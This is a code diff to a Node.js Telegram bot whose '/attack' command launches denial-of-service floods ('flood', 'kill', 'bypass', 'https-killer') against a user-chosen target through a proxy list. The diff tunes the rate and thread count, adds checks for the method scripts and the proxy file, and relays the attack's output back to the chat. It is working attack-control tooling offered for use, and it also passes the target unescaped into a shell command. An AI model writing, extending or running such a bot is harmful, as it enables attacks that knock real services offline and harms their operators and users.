@@ -2,6 +2,7 @@ const TelegramBot = require('node-telegram-bot-api')
 const si = require('systeminformation')
 const { exec } = require('child_process')
 const express = require('express')
+const fs = require('fs')
 const app = express()
 const port = process.env.PORT || 3000
 
@@ -80,15 +81,25 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     return
   }
 
-  const method = ['https-killer', 'flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'kill'
+  const method = ['flood', 'kill', 'bypass', 'https-killer'].includes(params[0]) ? params[0] : 'flood'
   const target = params.length === 3 ? params[1] : params[0]
   const time = parseInt(params.length === 3 ? params[2] : params[1])
-  const rate = 25
-  const threads = 10
+  const rate = 24
+  const threads = 12
   const proxyfile = './prx.txt'
 
   if (!target || isNaN(time) || time <= 0) {
     bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
+    return
+  }
+
+  if (!fs.existsSync(`${method}.js`)) {
+    bot.sendMessage(msg.chat.id, `Error: Method script ${method}.js not found`)
+    return
+  }
+
+  if (!fs.existsSync(proxyfile)) {
+    bot.sendMessage(msg.chat.id, `Error: Proxy file ${proxyfile} not found`)
     return
   }
 
@@ -117,13 +128,14 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   attackData.messageId = sentMsg.message_id
 
-  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
+  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err, stdout, stderr) => {
     if (err) {
-      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`)
+      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}\n${stderr || 'No stderr output'}`)
       attacks = attacks.filter(a => a.id !== attackId)
+      bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
       return
     }
-    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
+    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully\n${stdout || 'No stdout output'}`)
   })
 
   child.on('error', (err) => {
